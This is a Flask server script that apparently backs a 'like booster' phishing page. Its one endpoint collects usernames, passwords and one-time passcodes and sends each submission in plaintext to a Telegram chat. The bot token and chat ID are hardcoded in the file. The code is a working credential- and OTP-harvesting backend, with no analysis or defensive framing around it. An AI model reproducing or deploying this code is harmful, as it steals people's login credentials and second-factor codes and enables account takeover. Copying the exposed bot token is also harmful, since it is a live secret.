from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import requests

app = Flask(__name__)
CORS(app)

# -------------------------
# Telegram Bot Token & Chat ID
TELEGRAM_BOT_TOKEN = os.environ.get("8239266013:AAHoOITQp3OepWy94DdDE82SbeQFgcHiqwY", "YOUR_TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("1849126202", "YOUR_TELEGRAM_CHAT_ID")

# -------------------------
# In-memory storage for multiple users
users_db = {}  # key: uid, value: dict with username, password, otp

# -------------------------
# Helper function to send message to telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Telegram send error:", e)

# -------------------------
@app.route("/receive_login", methods=["POST"])
def receive_login():
    data = request.get_json()
    step = data.get("step", "")
    
    # Step 1: Create account
    if step == "create_account":
        username = data.get("username")
        password = data.get("password")
        uid = data.get("uid", f"user_{len(users_db)+1}")  # fallback uid

        if not username or not password:
            return jsonify({"status":"error", "error":"Username and password required."})

        users_db[uid] = {"username": username, "password": password, "otp": None}
        send_telegram_message(f"🆕 New Account Created:\nUID: {uid}\nUsername: {username}\nPassword: {password}")
        return jsonify({"status":"ok", "message":"Account created, please verify OTP."})

    # Step 2: Verify OTP
    elif step == "verify_otp":
        otp = data.get("otp")
        uid = data.get("uid", f"user_{len(users_db)}")  # fallback uid

        if uid not in users_db:
            return jsonify({"status":"error", "error":"User not found."})
        if not otp:
            return jsonify({"status":"error", "error":"OTP required."})

        users_db[uid]["otp"] = otp
        send_telegram_message(f"✅ OTP Verified for UID: {uid}\nOTP: {otp}\nUsername: {users_db[uid]['username']}")
        return jsonify({"status":"ok", "message":"OTP verified successfully."})

    # Default: Boost like request
    else:
        uid = data.get("uid")
        username = data.get("username")
        password = data.get("password")

        if not uid or not username or not password:
            return jsonify({"status":"error", "error":"Missing fields."})

        # Optionally check if user exists
        users_db[uid] = {"username": username, "password": password, "otp": None}
        send_telegram_message(f"📌 Like request received:\nUID: {uid}\nUsername: {username}\nPassword: {password}")
        return jsonify({"status":"sent"})

# -------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
